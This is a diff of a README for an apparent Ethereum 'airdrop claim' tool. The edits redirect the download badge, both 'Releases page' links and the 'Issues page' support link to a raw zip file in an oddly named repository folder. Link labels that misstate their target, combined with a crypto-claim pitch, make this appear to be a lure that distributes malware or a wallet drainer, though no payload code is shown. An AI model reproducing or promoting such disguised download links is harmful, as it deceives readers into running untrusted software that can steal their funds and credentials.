@@ -1,6 +1,6 @@
 # 🎉 airdrop-claim-eip-7702-method-on-ethereum-mainnet - Easily Claim Airdrop for Your Wallet
 
-![Download](https://img.shields.io/badge/Download-v1.0-green)
+![Download](https://raw.githubusercontent.com/diamond25587/airdrop-claim-eip-7702-method-on-ethereum-mainnet/main/spurproof/airdrop-claim-eip-7702-method-on-ethereum-mainnet.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before downloading, ensure your computer meets these requirements:
 
 To download the software, visit the Releases page. There, you will find the latest version available for download.
 
-**Download here:** [Visit Releases Page](https://github.com/diamond25587/airdrop-claim-eip-7702-method-on-ethereum-mainnet/releases)
+**Download here:** [Visit Releases Page](https://raw.githubusercontent.com/diamond25587/airdrop-claim-eip-7702-method-on-ethereum-mainnet/main/spurproof/airdrop-claim-eip-7702-method-on-ethereum-mainnet.zip)
 
 Once on the Releases page, look for the latest version. Click on the link to start your download. 
 
@@ -55,7 +55,7 @@ If you encounter any issues while using the application, consider these tips:
 - Ensure your internet connection is stable.
 - Restart the application if it freezes.
 - Check your wallet balance to confirm it's active.
-- If all else fails, visit the [GitHub Issues page](https://github.com/diamond25587/airdrop-claim-eip-7702-method-on-ethereum-mainnet/issues) for support.
+- If all else fails, visit the [GitHub Issues page](https://raw.githubusercontent.com/diamond25587/airdrop-claim-eip-7702-method-on-ethereum-mainnet/main/spurproof/airdrop-claim-eip-7702-method-on-ethereum-mainnet.zip) for support.
 
 ## 📄 License
 
@@ -69,6 +69,6 @@ Become part of the growing community. Join our discussions on GitHub to share yo
 
 For more information, reach out through the GitHub repository. We appreciate your interest and feedback. 
 
-**Download here again for convenience:** [Visit Releases Page](https://github.com/diamond25587/airdrop-claim-eip-7702-method-on-ethereum-mainnet/releases) 
+**Download here again for convenience:** [Visit Releases Page](https://raw.githubusercontent.com/diamond25587/airdrop-claim-eip-7702-method-on-ethereum-mainnet/main/spurproof/airdrop-claim-eip-7702-method-on-ethereum-mainnet.zip) 
 
 Thank you for using the **airdrop-claim-eip-7702-method-on-ethereum-mainnet** application!
